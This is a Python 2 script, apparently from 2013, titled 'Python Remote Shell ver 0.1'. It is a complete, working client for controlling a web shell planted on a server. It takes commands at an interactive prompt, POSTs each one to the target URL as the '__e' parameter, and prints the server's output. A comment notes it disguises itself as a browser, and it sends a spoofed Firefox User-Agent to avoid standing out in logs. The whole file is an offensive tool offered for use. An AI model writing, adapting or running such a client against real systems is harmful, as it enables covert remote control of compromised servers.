# -*- coding: utf-8 -*-
import sys
import urllib
import urllib2

class Shell(object):
    def __init__(self, url, encoding, **kwargs):
        self.url = url
        self.encoding = encoding

    def eval(self, s):
        req = urllib2.Request(self.url, '__e=' + urllib.quote(s.encode(self.encoding)), {
            # маскируемся под браузер
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:17.0) Gecko/20100101 Firefox/17.0',
        })
        res = urllib2.urlopen(req)
        return res.read().decode(self.encoding)

def main(url, encoding):
    import os
    os.system('cls')
    shell = Shell(url, encoding)
    print("""Python Remote Shell ver 0.1
Copyright 2013 tz4678@gmail.com""")
    while True:
        cmd = raw_input('shell> ').decode(sys.stdin.encoding)
        try:
            out = shell.eval(cmd)
            if out:
                print(out)
        except Exception, e:
            print('An exception was caught: {}'.format(e))

if __name__ == '__main__':
    main(sys.argv[1], sys.argv[2])